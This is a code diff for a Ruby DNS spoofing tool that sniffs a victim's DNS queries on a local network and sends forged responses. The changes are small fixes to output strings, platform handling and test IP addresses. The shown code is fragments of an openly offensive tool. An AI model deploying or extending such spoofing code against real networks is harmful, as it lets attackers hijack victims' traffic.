@@ -23,7 +23,7 @@ class DnsSpoof
         
         # Check for values
         if routerIP == nil || victimIP == nil || interface == nil
-            fatalError(")Usage: routerIP victimIP interface\n")
+            fatalError("Usage: routerIP victimIP interface\n")
         end
         
         # Store global info
@@ -90,12 +90,8 @@ private
                 packet = Packet.parse(pkt)
                 
                 # Check for the platform before using to_s
-                if RUBY_PLATFORM =~ /darwin/
-                    dnsQuery = packet.payload[2].to_s(base=16) + \
-                               packet.payload[3].to_s(base=16)
-                else
-                    dnsQuery = packet.payload[2].to_s + packet.payload[3].to_s
-                end
+                dnsQuery = packet.payload[2].to_s + packet.payload[3].to_s
+                
                 # Make sure we have a query packet
                 if dnsQuery == '10'
                     domainName = getDomainName(packet.payload[12..-1])
@@ -104,7 +100,7 @@ private
                         next
                     end
                     
-                    puts "\nDNS request for: " + domainName
+                    puts "DNS request for: " + domainName
                     
                     sendResponse(packet, domainName)
                 end
@@ -151,7 +147,7 @@ private
         
         # Send the packet out
         response.to_w(@interface)
-        puts "sent packet out\n"
+        puts "\nsent packet out\n"
         
     end
     
@@ -207,7 +203,7 @@ private
 end
 
 def test
-    spoof = DnsSpoof.new("192.168.0.1", "192.168.0.180", "en1")
+    spoof = DnsSpoof.new("192.168.1.1", "192.168.1.115", "en0")
     spoof.main
 end
 
